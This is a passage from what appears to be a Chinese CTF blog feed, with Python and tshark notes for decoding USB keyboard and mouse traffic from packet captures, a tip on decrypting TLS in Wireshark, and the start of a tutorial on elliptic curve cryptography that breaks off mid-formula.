class="line"><span class="comment">#脚本2</span></span><br><span class="line">normalKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">  <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> output[a]</span><br><span class="line"><span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">flag+=<span class="number">1</span></span><br><span class="line">output.pop(i)</span><br><span class="line"><span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">output[i]=output[i].upper()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>​    </p></li></ol></li><li><h4 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h4><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为<strong>四个字节</strong>。</p><p>第一个字节代表按键，当取<code>0x00</code>时代表没有按键，为<code>0x01</code>时代表按左键，为<code>0x02</code>时代表按右键。</p><p>第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。</p><p>第三个字节与第二字节类似，代表垂直上下移动的偏移。</p><p><strong>步骤</strong>：</p><ol><li><p>tshark命令提取cap data</p><p><code>tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></p><p><code>tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code>（去空行）</p></li><li><p>将鼠标数据还原鼠标移动轨迹</p><p>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。</p><p>有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code>。</p><p>加冒号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:</span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure></li><li><p>测试信息隐藏位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">12</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">x = <span class="built_in">int</span>(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">x -= <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">y -= <span class="number">256</span></span><br><span class="line">posx += x</span><br><span class="line">posy += y</span><br><span class="line">btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line"><span class="keyword">if</span> btn_flag == <span class="number">2</span> : <span class="comment"># 1 代表左键</span></span><br><span class="line">f.write(<span class="built_in">str</span>(posx))</span><br><span class="line">f.write(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(posy))</span><br><span class="line">f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></li><li><p>gnuplot将坐标转化成图像</p><p><code>gnuplot</code></p><p><code>gnuplot&gt; plot &quot;xy.txt&quot;</code></p><p>​    </p></li></ol></li><li><h3 id="TLS流量"><a href="#TLS流量" class="headerlink" title="TLS流量"></a>TLS流量</h3><p>解密：Wireshark首选项 - TLS - RSA keys list - Edit… - TLS Decrypt</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;h3 id=&quot;USB流量&quot;&gt;&lt;a href=&quot;#USB流量&quot; class=&quot;headerlink&quot; title=&quot;USB流量&quot;&gt;&lt;/a&gt;USB流量&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;h4 id=&quot;键盘流量&quot;&gt;&lt;a href=&quot;#键盘流量&quot; class=&quot;he</summary>
      
    
    
    
    <category term="misc" scheme="https://lazzzaro.github.io/categories/misc/"/>
    
    
    <category term="流量" scheme="https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"/>
    
    <category term="USB" scheme="https://lazzzaro.github.io/tags/USB/"/>
    
  </entry>
  
  <entry>
    <title>ECC</title>
    <link href="https://lazzzaro.github.io/2020/11/07/crypto-ECC/"/>
    <id>https://lazzzaro.github.io/2020/11/07/crypto-ECC/</id>
    <published>2020-11-07T11:33:18.000Z</published>
    <updated>2021-10-16T15:21:23.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h2><p>椭圆曲线密码学（英语：Elliptic Curve Cryptography，缩写：ECC）是一种基于椭圆曲线数学的公开密钥加密算法。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有<strong>以素数为模的整数域</strong> $\text{GF}(p)$和<strong>特征为2的伽罗华域</strong> $\text{GF}(2^m)$。</p><p>​    </p><h4 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h4><p>椭圆曲线的定义式：$y^2+axy+by=x^3+cx^2+dx+e$ </p><p>一般方程：$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$</p><ul><li><h5 id="最常用方程（维尔斯特拉斯标准形式）"><a href="#最常用方程（维尔斯特拉斯标准形式）" class="headerlink" title="最常用方程（维尔斯特拉斯标准形式）"></a>最常用方程（维尔斯特拉斯标准形式）</h5><p>$y^2=x^3+ax+b$，判别式 $\Delta=-16(4a^3+27b^2)\neq 0$ </p><blockquote><p>椭圆曲线的定义也要求曲线是非奇异的。几何上来说，这意味着图像里面没有尖点、自相交或孤立点。代数上来说，这成立当且仅当判别式 $\Delta \neq 0$。</p></blockquote><p>还需要一个无穷远点作为曲线的一部分，用 $\text{O}$ 表示。</p></li><li><h5 id="椭圆曲线表达式"><a href="#椭圆曲线表达式" class="headerlink" title="椭圆曲线表达式"></a>椭圆曲线表达式</h5><p>$\{(x,y) \in \mathbb{R}^2 \mid y^2=x^3+ax+b,4a^3+27b^2\neq0\} \cup \{\text{O}\}$</p></li><li><h5 id="椭圆曲线阿尔贝群"><a href="#椭圆曲线阿尔贝群" class="headerlink" title="椭圆曲线阿尔贝群"></a>椭圆曲线阿尔贝群</h5><p>$\text{O}$ 为零元，相反数 $P$ 为关于X轴对称的另一边的点，加法规则为直线三点 $P+Q+R=0$。</p></li><li><h5 id="几何加法"><a href="#几何加法" class="headerlink" title="几何加法"></a>几何加法</h5><p>普通相交三点：$P+Q+R=0$</p><p>普通相交两点：$P+P+Q=0$，$P+Q+Q=0$ （一点相切）</p><p>垂直相交两点：$P+Q+0=0$ （垂直X轴）</p><p>垂直相交一点：$P+P+0=0$ （垂直X轴+一点相切）</p></li><li><h5 id="代数加法"><a href="#代数加法" class="headerlink" title="代数加法"></a>代数加法</h5><p>去掉特殊情况，只考虑两个非零非对称的点 $P=(x_P,y_P)$ 和 $Q=(x_Q,y_Q)$。</p><p><strong>若 $P$ 和 $Q$ 不同</strong>，即 $x_P \neq x_Q$，直线斜率 $k=\cfrac{y_P-y_Q}{x_P-x_Q}$</p><p><strong>若 $P$ 和 $Q$ 相同</strong>，即 $x_P =x_Q$，直线斜率 $k=\cfrac{3x_P^2+a}{2y_P}$</p><p>这条直线和椭圆曲线的交点 $R=(x_R,y_R)$，则：</p><p>$x_R=k^2-x_P-x_Q$</p><p>$y_R=y_P+k(x_R-x_P)=y_Q+k(x_R-x_Q)$</p><p>于是：$P+Q=(x_P,y_P)+(x_Q,y_Q)=-R=(x_R,-y_R)$</p></li><li><h5 id="标量积（点积-数乘-倍乘）"><a href="#标量积（点积-数乘-倍乘）" class="headerlink" title="标量积（点积/数乘/倍乘）"></a>标量积（点积/数乘/倍乘）</h5><p>$Q=nP=P+P+\cdots+P=\sum_{i=0}^{n-1}(b_i\cdot2^i)P,\quad b_i=\{0,1\}$，$b_i$ 为 $n$ 的各比特位值。</p></li><li><h5 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h5><p>$Q=nP$，已知 $Q,P$，求 $n$。</p><p>​    </p></li></ul><h4 id="有限域椭圆曲线"><a href="#有限域椭圆曲线" class="headerlink" title="有限域椭圆曲线"></a>有限域椭圆曲线</h4><p>椭圆曲线是连续的，并不适合用于加密，所以必须把椭圆曲线变成离散的点，把椭圆曲线定义在有限域上。</p><p>有限域上的椭圆曲线是指在椭圆曲线的定义式中，所有的系数都是在某个有限域 $\text{GF}(p)$ 中的元素，其中 $p$ 为一个大素数。</p><p>给出一个有限域 $\text{F}p$，</p><ol><li>$\text{F}p$ 中有 $p$（$p$ 为质数）个元素 $0,1,2,\cdots,p-1$；</li><li>$\text{F}p$ 的加法是 $a+b \equiv c \pmod p$；</li><li>$\text{F}p$ 的乘法是 $a\times b \equiv c \pmod p$；</li><li>$\text{F}p$ 的除法是 $\cfrac{a}{b} \equiv c \pmod p$，即 $a \times b^{-1} \equiv c \pmod p$，$b^{-1}$ 为 $b$ 的逆元，满足 $b \times b^{-1} \equiv 1 \pmod p$；</li><li>$\text{F}p$ 的单位元是 $1$，零元是 $\text{O}$；</li><li>$\text{F}p$ 域内运算满足交换律、结合律、分配率。</li></ol><p><strong>椭圆曲线</strong> $\text{E}p(a,b)$，$p$ 为质数，$x,y \in [0,p-1]$：$y^2=x^3+ax+b \pmod p$，</p><p>选择两个满足下列约束条件的小于 $p$ 的非负整数 $a,b$：$4a^3+27b^2 \neq 0 \pmod p$。</p><p>$\text{F}p$ 上的椭圆曲线同样有加法：</p><ol><li><p>无穷远点 $\text{O}$ 是零元，有 $\text{O}+\text{O}=\text{O}$，$\text{O}+P=P$；</p></li><li><p>$P(x,y)$ 的负元是 $(x,-y \bmod p)=(x,p-y)$，有 $P+(-P)=\text{O}$；</p></li><li><p>$P(x_1,y_1),Q(x_2,y_2)$ 的和 $R(x_3,y_3)$ 有如下关系：</p><p>$x_3 \equiv k^2-x_1-x_2 \pmod p$</p><p>$y_3 \equiv k(x_1-x_3)-y_1 \pmod p$</p><p>若 $P=Q$ 则 $k=\cfrac{3x_1^2+a}{2y_1}\pmod p$；</p><p>若 $P \neq Q$ 则 $k=\cfrac{y_2-y_1}{x_2-x_1} \pmod p$。 </p></li></ol><ul><li><h5 id="点的阶"><a href="#点的阶" class="headerlink" title="点的阶"></a>点的阶</h5><p>如果椭圆曲线上一点 $P$，存在最小的正整数 $n$ 使得数乘 $nP=\text{O}$ ，则将 $n$ 称为 $P$ 的阶；若 $n$ 不存在，则 $P$ 是无限阶的。</p></li><li><h5 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h5><p>考虑 $K=kG$ ，其中 $K,G$ 为椭圆曲线 $\text{E}p(a,b)$ 上的点，$n$ 为 $G$ 的阶（$nG=\text{O}$），$k$ 为小于 $n$ 的整数。</p><p>给定 $k$ 和 $G$ ，根据加法法则，计算 $K$ 很容易，但反过来，给定 $K$ 和 $G$，求 $k$ 就非常困难。因为实际使用中的ECC原则上把 $p$ 取得相当大，$n$ 也相当大，要把 $n$ 个解点逐一算出来列成上表是不可能的。</p><p>这就是椭圆曲线加密算法的数学依据。</p><p>点 $G$ 称为<strong>基点</strong> (base point)，$k$  ($k&lt;n$) 为<strong>私有密钥</strong> (private key)，$K$ 为<strong>公开密钥</strong> (public key)。</p></li><li><h5 id="通信算法"><a href="#通信算法" class="headerlink" title="通信算法"></a>通信算法</h5><ol><li><p>A选定一条椭圆曲线 $\text{E}p(a,b)$，并取椭圆曲线上一点作为基点 $G$；</p></li><li><p>A选择一个私有密钥 $k$  ($k&lt;n$)，并生成公开密钥 $K=kG$；</p></li><li><p>A将 $\text{E}p(a,b)$ 和点 $K,G$ 传给B；</p></li><li><p>B收到信息后，将待传输的明文编码到 $\text{E}p(a,b)$ 上的一点 $M$，并产生一个随机整数 $r$（$r&lt;n$，$n$ 为 $G$ 的阶数）；</p></li><li><p>B计算点 $C_1=M+rK$ 和 